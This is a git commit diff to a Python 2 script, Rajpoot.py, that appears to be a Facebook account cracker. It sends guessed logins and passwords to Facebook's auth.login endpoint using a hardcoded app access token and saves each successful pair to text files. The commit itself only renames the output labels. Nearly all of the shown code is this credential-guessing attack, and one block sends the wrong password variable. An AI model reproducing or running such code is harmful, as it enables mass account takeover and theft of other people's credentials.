54724cbc0f69fdc2f42135b0286f6c6d18b4d1b5
Usman132 <94742896+Usman132@users.noreply.github.com>
2021-11-24 21:06:59 +0500

    Update Rajpoot.py
    https://gitHub.com/Usman123/RAJPOOT11
    ls
    cd RAJPOOT
    ls
    python2 Rajpoot.py

--- Rajpoot.py
+++ Rajpoot.py
@@ -158,7 +158,7 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;96m  [RAJPOOT_Temp_Lock]  ' + k + c + user + '  |  ' + pass1
+                print '\x1b[1;96m  [RAJPOOT_OK]  ' + k + c + user + '  |  ' + pass1
                 okb = open('save/CP.txt', 'a')
                 okb.write(k + c + user + pass1 + '\n')
                 okb.close()
@@ -174,7 +174,7 @@ def action():
                 data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print '\x1b[1;96m  [RAJPOOT_Temp_Lock] ' + k + c + user + '  |  ' + pass2
+                    print '\x1b[1;96m  [RAJPOOT_OK] ' + k + c + user + '  |  ' + pass2
                     okb = open('save/OK.txt', 'a')
                     okb.write(k + c + user + pass2 + '\n')
                     okb.close()
@@ -190,7 +190,7 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;96m  [RAJPOOT_Temp_Lock]  ' + k + c + user + '  |  ' + pass3
+                        print '\x1b[1;96m  [RAJPOOT_OK]  ' + k + c + user + '  |  ' + pass3
                         okb = open('save/CP.txt', 'a')
                         okb.write(k + c + user + pass3 + '\n')
                         okb.close()
@@ -206,7 +206,7 @@ def action():
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
-                        print '\x1b[1;96m  [RAJPOOT_Temp_Lock]  ' + k + c + user + '  |  ' + pass4
+                        print '\x1b[1;96m  [RAJPOOT_OK]  ' + k + c + user + '  |  ' + pass4
                         okb = open('save/CP.txt', 'a')
                         okb.write(k + c + user + pass4 + '\n')
                         okb.close()
